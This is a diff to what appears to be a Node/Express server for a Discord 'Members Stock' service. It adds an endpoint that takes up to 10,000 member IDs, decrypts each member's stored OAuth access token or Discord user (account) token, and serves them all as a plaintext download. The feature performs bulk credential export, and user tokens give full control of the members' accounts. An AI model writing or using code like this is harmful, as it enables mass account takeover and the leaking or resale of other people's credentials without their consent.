@@ -9534,6 +9534,51 @@ app.post("/api/community/sync", requireSession, async (_req, res, next) => {
   }
 });
 
+app.post("/api/community/members/export-tokens", requireSession, async (req, res, next) => {
+  try {
+    const requestedIds = [...new Set((Array.isArray(req.body?.discordUserIds) ? req.body.discordUserIds : [])
+      .map((value) => String(value ?? "").trim())
+      .filter(isDiscordGuildId))].slice(0, 10_000);
+    const tokenType = req.body?.tokenType === "account" ? "account" : "access";
+    if (!requestedIds.length) return res.status(400).json({ message: "Select at least one member." });
+    const config = await getCommunityOAuthConfig();
+    if (!config.configured) return res.status(503).json({ message: "Configure Members Stock before exporting tokens." });
+
+    const column = tokenType === "account" ? "encrypted_account_token" : "encrypted_access_token";
+    const result = await pool.query(
+      `SELECT discord_user_id, ${column} AS encrypted_token
+       FROM community_oauth_joins
+       WHERE guild_id = $1 AND discord_user_id = ANY($2::text[])`,
+      [config.guildId, requestedIds]
+    );
+    const encryptedById = new Map(result.rows.map((row) => [String(row.discord_user_id), row.encrypted_token]));
+    const tokens = requestedIds.flatMap((discordUserId) => {
+      const encrypted = encryptedById.get(discordUserId);
+      if (!encrypted) return [];
+      try {
+        const token = String(decryptCredential(encrypted) ?? "").trim();
+        return token ? [token] : [];
+      } catch {
+        return [];
+      }
+    });
+    if (!tokens.length) {
+      return res.status(404).json({ message: `None of the selected members has a stored ${tokenType === "account" ? "user" : "access"} token.` });
+    }
+    const filename = `members-${tokenType === "account" ? "user" : "access"}-tokens-${new Date().toISOString().slice(0, 10)}.txt`;
+    res.set({
+      "Cache-Control": "no-store, no-cache, must-revalidate, private",
+      Pragma: "no-cache",
+      "Content-Type": "text/plain; charset=utf-8",
+      "Content-Disposition": `attachment; filename="${filename}"`,
+      "X-Token-Count": String(tokens.length),
+      "X-Skipped-Count": String(requestedIds.length - tokens.length)
+    }).send(`${tokens.join("\n")}\n`);
+  } catch (error) {
+    next(error);
+  }
+});
+
 app.get("/api/community/members/:discordUserId/access-token", requireSession, async (req, res, next) => {
   try {
     const discordUserId = String(req.params.discordUserId ?? "").trim();
